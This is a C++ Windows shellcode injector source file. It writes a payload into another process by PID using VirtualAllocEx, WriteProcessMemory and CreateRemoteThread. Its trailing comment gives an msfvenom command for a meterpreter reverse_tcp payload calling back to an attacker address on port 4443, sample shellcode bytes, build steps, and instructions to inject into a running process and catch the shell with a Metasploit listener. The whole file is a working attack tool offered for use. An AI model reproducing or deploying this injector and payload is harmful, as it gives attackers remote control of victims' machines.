#include <iostream>
#include <Windows.h>

int main(int argc, char* argv[])
{
	unsigned char shellcode[] =
		"shellcode here";

	HANDLE Process_Handle = OpenProcess(PROCESS_ALL_ACCESS, 0, DWORD(atoi(argv[1])));
	PVOID Alloc = VirtualAllocEx(Process_Handle, NULL, sizeof shellcode, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	if (Alloc)
	{
		WriteProcessMemory(Process_Handle, Alloc, shellcode, sizeof shellcode, NULL);
		HANDLE Remote_Thread = CreateRemoteThread(Process_Handle, NULL, 0, (LPTHREAD_START_ROUTINE)Alloc, NULL, 0, NULL);
	}
	CloseHandle(Process_Handle);

	return 0;
}

/*
### Generate Payload
+ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.x.x lport=4443 -f c -b '\x00\xff\x0a\x0d'

+-> example: 
    "\xdd\x84\xeb\xf7\x2a\xaa\x04\x37\xd2\x61\x4d\x5f\x59\xe4\x3f"
    "\xfe\x5e\x2d\xe1\x5e\x5e\xc2\x3a\x51\x25\xab\xbd\x92\xda\xa5"
    ...
    "\xd9\x93\xda\xc9\xdf\xa8\x0c\xf0\x95\xef\x8c\x47\xa5\x5a\xb0"
    "\xee\x2c\xa4\xe6\xf1\x64";

+ Open Visual Basic -> Create new C++ project
+ Copy the generated shell-code and past it on the line 7 ("shellcode here") inside the injector.cpp file.
+ Build the project.

### Usage
+ To inject the PID in windows, just type injector.exe with the process id number on command prompt.

+-> example: injector.exe 17890 (calc.exe process id)

+ Open metasploit to listener the payload.

### Credit
Code by https://github.com/swagkarna
